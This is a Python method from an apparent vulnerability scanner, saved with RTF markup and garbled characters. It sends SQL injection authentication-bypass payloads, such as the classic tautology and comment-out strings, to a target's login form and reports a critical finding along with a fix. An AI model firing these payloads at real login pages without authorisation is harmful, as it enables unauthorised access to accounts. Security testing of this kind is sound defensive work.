    # ├втАЭтВм├втАЭтВм 8. Authentication Bypass via SQLi ├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм├втАЭтВм\par 
    def _check_auth_bypass(self):\par 
        """\par 
        Attempts login with SQLi payloads to confirm authentication bypass.\par 
        """\par 
        login_url   = f"\{self.target\}/login"\par 
        bypass_payloads = [\par 
            ("' OR '1'='1'--",  "Classic tautology bypass"),\par 
            ("admin'--",         "Comment-out password bypass"),\par 
            ("' OR 1=1--",       "Numeric OR tautology"),\par 
        ]\par 
        for username_payload, desc in bypass_payloads:\par 
            try:\par 
                data = \{"username": username_payload, "password": "anything"\}\par 
                resp = self.session.post(login_url, data=data,\par 
                                         timeout=self.timeout)\par 
                body = resp.text\par 
                # Confirmed if the response shows a successful login message\par 
                if re.search(r"logged in as|welcome.*admin|id=", body, re.IGNORECASE):\par 
                    self._add(\par 
                        vuln_type  = "Authentication Bypass via SQL Injection",\par 
                        detail     = (\par 
                            f"Login form bypassed using SQLi payload: '\{username_payload\}' "\par 
                            f"├втВмтАЭ \{desc\}. Response confirms successful login."\par 
                        ),\par 
                        severity   = "CRITICAL",\par 
                        cwe        = "CWE-287",\par 
                        mitre      = "T1078",\par 
                        evidence   = (\par 
                            f"POST /login username='\{username_payload\}' password='anything' "\par 
                            f"├втАатАЩ HTTP \{resp.status_code\} | Response: "\par 
                            + body[body.lower().find("logged"):body.lower().find("logged")+80]\par 
                        ),\par 
                        check      = "_check_auth_bypass",\par 
                        confirmed  = True,\par 
                        recommendation = (\par 
                            "Use parameterised queries for all authentication checks. "\par 
                            "Implement account lockout and rate limiting."\par 
                        ),\par 
                    )\par 
                    break\par 
            except Exception:\par 
                continue\par 
